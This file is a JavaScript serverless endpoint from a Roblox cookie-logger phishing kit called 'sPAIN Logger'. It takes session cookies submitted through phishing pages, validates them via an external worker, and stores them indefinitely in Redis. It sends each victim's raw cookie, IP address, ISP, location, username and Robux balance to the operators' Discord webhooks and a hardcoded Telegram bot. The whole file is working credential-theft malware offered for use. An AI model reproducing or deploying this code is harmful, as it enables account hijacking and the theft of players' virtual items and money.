// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';

function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

async function redisSet(key, value) {
  try {
    const res = await fetch(`${REDIS_URL}/pipeline`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${REDIS_TOKEN}`, 'Content-Type': 'application/json' },
      body: JSON.stringify([['SET', key, JSON.stringify(value)]])
    });
    return res.ok;
  } catch { return false; }
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`);
    const d = await r.json();
    return d.status === 'success' ? d : null;
  } catch { return null; }
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

function generateId() {
  const c = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let id = '';
  for (let i = 0; i < 48; i++) id += c[Math.floor(Math.random() * c.length)];
  return id;
}

const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
function extractCookie(raw) {
  if (!raw) return null;
  const s = String(raw).trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/); if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                    if (m2) return WARN + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/);                                if (m3) return WARN + m3[1];
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
  return null;
}
function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}

// Lite worker call — only auth + robux (2 API calls, fast)
async function getLiteInfo(cookie) {
  try {
    const r = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie, lite: true })
    });
    if (!r.ok) return null;
    const d = await r.json();
    return d.valid ? d : null;
  } catch { return null; }
}

async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

async function discordChunked(url, text) {
  let rem = text; let first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, 1990); rem = rem.substring(1990);
    await discordSend(url, {
      content: first
        ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '')
        : chunk + (rem.length === 0 ? '\n```' : '')
    });
    first = false;
  }
}

// Two embeds matching the screenshot + raw cookie
async function sendHit(webhookUrl, { cookie, ip, geo, now, pageName, refreshUrl, username, robux, avatarUrl }) {
  // Embed 1: Robux only (matches screenshot style)
  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      title: '💰 Robux',
      color: 0xc026d3,
      thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
      fields: [
        { name: '💰 Balance', value: `\`${Number(robux || 0).toLocaleString()} R$\``, inline: true }
      ],
      footer: { text: `sPAIN Logger • ${pageName} • ${now}` }
    }]
  });

  // Embed 2: IP, ISP, location + dashboard link
  await discordSend(webhookUrl, {
    embeds: [{
      title: `🧑 ${username}`,
      description: `:fire: \`sPAIN\` :fire:

🔄 [Dashboard](${refreshUrl})`,
      color: 0xc026d3,
      fields: [
        { name: '🌐 IP',       value: `\`${ip || 'Unknown'}\``,                                                           inline: true },
        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                              inline: true },
        { name: '📍 Location', value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown', inline: true }
      ],
      footer: { text: `sPAIN Logger • ${pageName} • ${now}` }
    }]
  });

  // Raw cookie
  await discordChunked(webhookUrl, cookie);
}

async function sendInvalid(webhookUrl, { ip, geo, now, pageName, cookie }) {
  await discordSend(webhookUrl, {
    embeds: [{
      title:  cookie ? '🤡 Wrong / Expired Cookie' : '⚠️ No Cookie Submitted',
      color:  cookie ? 0xff3333 : 0xff6600,
      fields: [
        { name: '🌐 IP',  value: `\`${ip || 'Unknown'}\``,                                                              inline: true },
        { name: '🗺️ ISP', value: geo?.isp || 'Unknown',                                                                 inline: true },
        { name: '🕐 Time',value: now,                                                                                    inline: false }
      ],
      footer: { text: `sPAIN Tools • ${pageName}` }
    }]
  });
  if (cookie) await discordChunked(webhookUrl, cookie);
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  const body = parseBody(req.body);
  const { slug, slots } = body;
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  const record = await redisGet(`slot:${slug}`);
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  const ip       = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
  const cookie   = findCookie(slots);
  const now      = new Date().toISOString();
  const pageName = record.displayName || slug;

  const webhooks = [record.webhook];
  if (record.dualhookParent) {
    try {
      const parent = await redisGet(`slot:${record.dualhookParent}`);
      if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);
    } catch (_) {}
  }

  // Run geo + lite worker in parallel — both fast
  const [geo, info] = await Promise.all([
    getIpGeo(ip),
    cookie ? getLiteInfo(cookie) : Promise.resolve(null)
  ]);

  if (!cookie || !info) {
    for (const wh of webhooks) await sendInvalid(wh, { ip, geo, now, pageName, cookie });
    await tgSend(`${cookie ? '🤡 INVALID' : '⚠️ NO COOKIE'} — ${pageName}\n🌐 ${ip}`);
    return res.status(200).json({ success: true });
  }

  // Store cookie — no TTL, lives until Roblox logs them out
  const refreshId  = generateId();
  const refreshUrl = `https://spain-tools.vercel.app/api/refresh?id=${refreshId}`;

  await redisSet(`refresh:${refreshId}`, {
    cookie,
    webhook:   record.webhook,
    webhook1:  webhooks[1] || null,
    pageName,
    ip,
    createdAt: now
  });

  for (const wh of webhooks) {
    await sendHit(wh, {
      cookie, ip, geo, now, pageName, refreshUrl,
      username:  info.username,
      robux:     info.robux,
      avatarUrl: info.avatarUrl
    });
  }

  await tgSend([
    `🍪 <b>CAPTURED — ${pageName}</b>`,
    `👤 ${info.username} | 💰 ${Number(info.robux||0).toLocaleString()} R$`,
    `🌐 <code>${ip}</code>`,
    `🔄 ${refreshUrl}`
  ].join('\n'));

  return res.status(200).json({ success: true });
}
